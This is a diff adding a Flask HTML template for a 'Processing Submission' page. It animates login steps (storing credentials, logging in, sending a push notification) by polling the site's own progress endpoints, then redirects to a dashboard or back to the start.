@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing Submission</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>Processing Your Submission...</h1>
+        <div id="submit-animation-container">
+            <canvas id="storing-animation" class="animation visible"></canvas>
+            <canvas id="login-animation" class="animation hidden"></canvas>
+            <canvas id="push-animation" class="animation hidden"></canvas>
+            <canvas id="success-animation" class="animation hidden"></canvas>
+            <canvas id="error-animation" class="animation hidden"></canvas>
+        </div>
+        <p id="status-message">Preparing to submit...</p>
+    </div>
+
+    <script type="module">
+        import { animationSteps, animationUrls } from "/static/js/animationConfig.js";
+        import { initializeAnimation, updateAnimationVisibility } from "/static/js/animationUtils.js";
+    
+        const email = localStorage.getItem("email");
+    
+        // Initialize animations
+        Object.entries(animationUrls).forEach(([step, url]) => {
+            initializeAnimation(animationSteps[step], url);
+        });
+    
+        function updateProgress(step, message = "") {
+            const stepMessages = {
+                1: "Storing your credentials securely...",
+                2: "Attempting to log in...",
+                3: "Sending a push notification to your device...",
+                4: "Login Successful! Redirecting to your dashboard...",
+                5: message || "Invalid username or password. Redirecting to the start...",
+            };
+        
+            // Update animation visibility
+            updateAnimationVisibility(step, animationSteps);
+        
+            // Update status message
+            const statusMessage = document.getElementById("status-message");
+            statusMessage.textContent = stepMessages[step] || "Processing...";
+        
+            // Redirect based on the step
+            if (step === 4) {
+                setTimeout(() => {
+                    window.location.href = `/dashboard?email=${encodeURIComponent(email)}`;
+                }, 2000);
+            } else if (step === 5) {
+                setTimeout(() => {
+                    window.location.href = "/";
+                }, 4000);
+            }
+        
+            // Post progress update to the backend
+            fetch("/update_progress", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ step }),
+            }).catch((error) => console.error("Error updating progress:", error));
+        }        
+    
+        function pollProgress() {
+            fetch("/get_progress")
+                .then((response) => response.json())
+                .then((data) => {
+                    if (data.step === 5 && data.error) {
+                        updateProgress(data.step, data.error);
+                    } else {
+                        updateProgress(data.step);
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error polling progress:", error);
+                });
+        }
+    
+        setInterval(pollProgress, 1000);
+    </script>    
+</body>
+</html>
